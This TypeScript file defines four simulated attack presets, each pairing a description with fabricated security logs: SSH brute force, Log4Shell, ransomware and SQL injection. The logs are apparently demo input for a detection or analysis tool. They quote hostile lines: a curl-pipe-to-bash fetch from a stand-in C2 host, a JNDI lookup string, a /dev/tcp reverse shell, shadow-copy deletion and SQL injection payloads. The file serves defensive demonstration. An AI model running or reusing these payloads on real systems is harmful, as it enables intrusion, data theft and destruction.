export interface AttackPreset {
  id: string;
  name: string;
  category: string;
  severity: 'LOW' | 'MEDIUM' | 'HIGH' | 'CRITICAL';
  description: string;
  source: string;
  rawLogs: string;
}

export const ATTACK_PRESETS: AttackPreset[] = [
  {
    id: 'ssh-bruteforce',
    name: 'Distributed SSH Brute-Force & Root Escalation',
    category: 'Credential Access',
    severity: 'CRITICAL',
    description: 'Multiple authentication failures from external IP targeting bastion host followed by interactive bash execution.',
    source: 'AuthSys, Auditd',
    rawLogs: `2026-09-21T02:14:01Z [AUTH] Failed password for invalid user admin from 198.51.100.42 port 49152 ssh2
2026-09-21T02:14:03Z [AUTH] Failed password for root from 198.51.100.42 port 49158 ssh2 [Attempt 15]
2026-09-21T02:14:05Z [AUTH] Failed password for root from 198.51.100.42 port 49165 ssh2 [Attempt 16]
2026-09-21T02:14:08Z [AUTH] Failed password for root from 198.51.100.42 port 49172 ssh2 [Attempt 17]
2026-09-21T02:14:12Z [AUTH] Accepted password for root from 198.51.100.42 port 49201 ssh2
2026-09-21T02:14:15Z [AUDITD] EXECVE: /bin/bash -c "curl -s http://malicious-c2.cc/payload.sh | bash" uid=0
2026-09-21T02:14:20Z [FIREWALL] Outbound connection initiated to 203.0.113.88:4444 [SUSPICIOUS_PORT]`
  },
  {
    id: 'log4j-rce',
    name: 'Log4Shell (CVE-2021-44228) JNDI Injection & Reverse Shell',
    category: 'Initial Access & Execution',
    severity: 'CRITICAL',
    description: 'Exploitation attempt targeting Java web application User-Agent header with LDAP JNDI lookup string.',
    source: 'Nginx, ModSecurity, WAF',
    rawLogs: `2026-09-21T03:30:12Z [NGINX] 185.220.101.5 - - [21/Sep/2026:03:30:12] "GET /login HTTP/1.1" 200 4520 "-" "\${jndi:ldap://evil-ldap.attacker.org:1389/Exploit}"
2026-09-21T03:30:13Z [MODSEC] [id "944240"] [msg "Remote Command Execution: Log4j CVE-2021-44228 JNDI string detected"] [severity "CRITICAL"]
2026-09-21T03:30:15Z [JAVA_APP] Exception in thread "main" javax.naming.NamingException: LDAP referral redirection
2026-09-21T03:30:18Z [AUDITD] type=EXECVE msg=audit(1695274218.102:445): argc=4 a0="/bin/sh" a1="-i" a2=">&" a3="/dev/tcp/185.220.101.5/9001"
2026-09-21T03:30:22Z [ENDPOINT] Process /bin/sh spawned by java runtime (pid 14022) established outbound socket`
  },
  {
    id: 'ransomware-canary',
    name: 'Ransomware Canary Alert & High-Entropy File Encryption',
    category: 'Impact & Destruction',
    severity: 'CRITICAL',
    description: 'Canary file modification triggered on SMB shared storage followed by rapid file extensions rename to .lockbit.',
    source: 'FileIntegrityMonitor, Sysmon',
    rawLogs: `2026-09-21T04:11:05Z [FIM] ALERT: Decoy Canary file modified: D:\\Shares\\Finance\\canary_trap.xlsx by user: svc_backup
2026-09-21T04:11:06Z [SYSMON] EventID 1: Process Creation: C:\\Windows\\Temp\\srvmgr.exe (Hash: e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855)
2026-09-21T04:11:09Z [SYSMON] EventID 11: FileCreate: D:\\Shares\\Finance\\Q3_Revenue.pdf.lockbit
2026-09-21T04:11:10Z [SYSMON] EventID 11: FileCreate: D:\\Shares\\Finance\\Payroll_2026.xlsx.lockbit
2026-09-21T04:11:12Z [FIM] High entropy (7.98) detected in 148 consecutive file writes within 5000ms
2026-09-21T04:11:15Z [CMD] EXEC: vssadmin.exe delete shadows /all /quiet`
  },
  {
    id: 'sql-injection',
    name: 'Blind SQL Injection & Database Exfiltration Attempt',
    category: 'Exfiltration',
    severity: 'HIGH',
    description: 'Automated sqlmap pattern probing eCommerce backend payment gateway parameter with UNION SELECT queries.',
    source: 'Cloudflare WAF, DB_Audit',
    rawLogs: `2026-09-21T05:01:22Z [WAF] 45.33.32.156 - "GET /api/products?cat=1%27%20UNION%20SELECT%20null,username,password_hash%20FROM%20users-- HTTP/1.1" 500
2026-09-21T05:01:23Z [DB_AUDIT] PostgreSQL syntax error: column "password_hash" does not exist in query from 10.0.1.25
2026-09-21T05:01:25Z [WAF] 45.33.32.156 - "GET /api/products?cat=1%20AND%20(SELECT%20pg_sleep(10)) HTTP/1.1" 200
2026-09-21T05:01:36Z [WAF] User-Agent: sqlmap/1.6#stable detected from 45.33.32.156`
  }
];
